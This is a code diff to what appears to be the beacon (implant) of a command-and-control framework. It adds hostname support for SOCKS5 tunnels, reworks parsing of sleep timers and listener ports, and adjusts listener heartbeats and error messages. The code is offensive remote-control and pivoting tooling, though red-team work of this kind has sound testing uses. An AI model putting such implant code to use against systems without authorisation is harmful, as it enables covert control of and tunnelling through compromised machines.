@@ -38,6 +38,8 @@ typedef ModuleCmd* (*constructProc)();
 
 namespace
 {
+constexpr const char* SocksHostnamePrefix = "host:";
+
 std::string getCurrentProcessArch()
 {
 #if defined(_M_IX86) || defined(__i386__)
@@ -51,6 +53,16 @@ std::string getCurrentProcessArch()
 #else
     return "unknown";
 #endif
+}
+
+bool hasSocksHostnamePrefix(const std::string& destination)
+{
+    return destination.rfind(SocksHostnamePrefix, 0) == 0;
+}
+
+std::string stripSocksHostnamePrefix(const std::string& destination)
+{
+    return destination.substr(std::char_traits<char>::length(SocksHostnamePrefix));
 }
 }
 
@@ -588,9 +600,9 @@ bool Beacon::runTasks()
     {
         C2Message listenerProofOfLife;
 
-        listenerProofOfLife.set_instruction(ListenerPollCmd);                            // Indicate this is a poll/proof message.
-        listenerProofOfLife.set_data(m_listeners[i]->getListenerHash());                // Include unique listener identifier.
-        listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerMetadata());     // Include listener status/metadata.
+        listenerProofOfLife.set_instruction(ListenerPollCmd);                           // Indicate this is a poll/proof message.
+        listenerProofOfLife.set_data(m_listeners[i]->getListenerMetadata());            // Include listener status/metadata.
+        listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerHash());         // Include unique listener identifier.
 
         // Add the heartbeat to the response queue.
         m_taskResult.push(listenerProofOfLife);
@@ -643,12 +655,13 @@ bool Beacon::handleEndInstruction(C2Message&, C2Message& c2RetMessage)
 bool Beacon::handleSleepInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 {
     std::string newSleepTimer = c2Message.cmd();
-    try
+    float sleepSeconds = 0.0f;
+    if (parseSleepSeconds(newSleepTimer, sleepSeconds))
     {
-        m_aliveTimerMs = std::stof(newSleepTimer) * 1000;
+        m_aliveTimerMs = static_cast<int>(sleepSeconds * 1000);
         newSleepTimer = std::to_string(m_aliveTimerMs) + "ms";
     }
-    catch (const std::invalid_argument&)
+    else
     {
         newSleepTimer = CmdStatusFail;
     }
@@ -704,11 +717,7 @@ bool Beacon::handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMes
 
             std::string localHost = splitedCmd[2];
             int localPort;
-            try
-            {
-                localPort = std::stoi(splitedCmd[3]);
-            }
-            catch (const std::invalid_argument&)
+            if (!parseTcpListenerPort(splitedCmd[3], localPort))
             {
                 c2RetMessage.set_errorCode(ERROR_PORT_FORMAT);
                 return false;
@@ -746,6 +755,9 @@ bool Beacon::handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMes
     }
     else if (splitedCmd[0] == StopCmd)
     {
+        if (splitedCmd.size() != 2)
+            return false;
+
         std::string listenerHash = splitedCmd[1];
         auto object = std::find_if(m_listeners.begin(), m_listeners.end(),
             [&](const std::unique_ptr<Listener>& obj){ return obj->getListenerHash().rfind(listenerHash, 0) == 0; });
@@ -754,7 +766,7 @@ bool Beacon::handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMes
         {
             c2RetMessage.set_cmd(cmd);
             c2RetMessage.set_returnvalue((*object)->getListenerHash());
-            m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
+            m_listeners.erase(object);
             return false;
         }
         else
@@ -789,9 +801,18 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
         std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());
         try
         {
-            uint32_t ip_dst = std::stoi(c2Message.data());
-            uint16_t port = std::stoi(c2Message.args());
-            int initResult = socksTunnelClient->init(ip_dst, port);
+            const std::string destination = c2Message.data();
+            uint16_t port = static_cast<uint16_t>(std::stoul(c2Message.args()));
+            int initResult = 0;
+            if (hasSocksHostnamePrefix(destination))
+            {
+                initResult = socksTunnelClient->initHostname(stripSocksHostnamePrefix(destination), port);
+            }
+            else
+            {
+                uint32_t ip_dst = static_cast<uint32_t>(std::stoul(destination));
+                initResult = socksTunnelClient->init(ip_dst, port);
+            }
             if (initResult)
             {
                 m_socksTunnelClient.push_back(std::move(socksTunnelClient));
@@ -800,14 +821,14 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
             else
             {
                 SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
-                c2RetMessage.set_data("fail");
+                c2RetMessage.set_data("fail:connect");
                 return false;
             }
         }
-        catch (const std::invalid_argument&)
+        catch (const std::exception&)
         {
             SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
-            c2RetMessage.set_errorCode(ERROR_GENERIC);
+            c2RetMessage.set_data("fail:invalid_destination");
             return false;
         }
         SPDLOG_DEBUG("Socks5 init Finished");
